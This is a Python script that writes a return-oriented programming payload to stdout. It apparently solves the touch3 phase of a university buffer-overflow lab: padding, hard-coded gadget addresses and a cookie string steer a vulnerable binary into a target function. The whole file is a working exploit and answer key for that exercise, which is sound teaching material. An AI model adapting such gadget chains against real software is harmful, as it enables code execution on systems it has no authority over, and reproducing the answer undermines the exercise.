import sys

mov_rsp_rax_addr = 0x401A06.to_bytes(byteorder="little", length=8)
mov_rax_rdi_addr = 0x4019C5.to_bytes(byteorder="little", length=8)
pop_rax_addr = 0x4019AB.to_bytes(byteorder="little", length=8)
cookie_offset_from_rsp = 32
mov_rax_edx_addr = 0x401A42.to_bytes(byteorder="little", length=8)
mov_edx_ecx_addr = 0x401A34.to_bytes(byteorder="little", length=8)
mov_ecx_rsi_addr = 0x401A13.to_bytes(byteorder="little", length=8)
lea_rdi_rsi_rax = 0x4019D6.to_bytes(byteorder="little", length=8)
touch3_addr = 0x4018FA.to_bytes(byteorder="little", length=8)

cookie = b"59b997fa\x00"
padding = b"a" * 40

payload = (
    padding
    + pop_rax_addr
    + cookie_offset_from_rsp.to_bytes(byteorder="little", length=8)
    + mov_rax_edx_addr
    + mov_edx_ecx_addr
    + mov_ecx_rsi_addr
    + mov_rsp_rax_addr
    + mov_rax_rdi_addr
    + lea_rdi_rsi_rax
    + mov_rax_rdi_addr
    + touch3_addr
    + cookie
)

sys.stdout.buffer.write(payload)
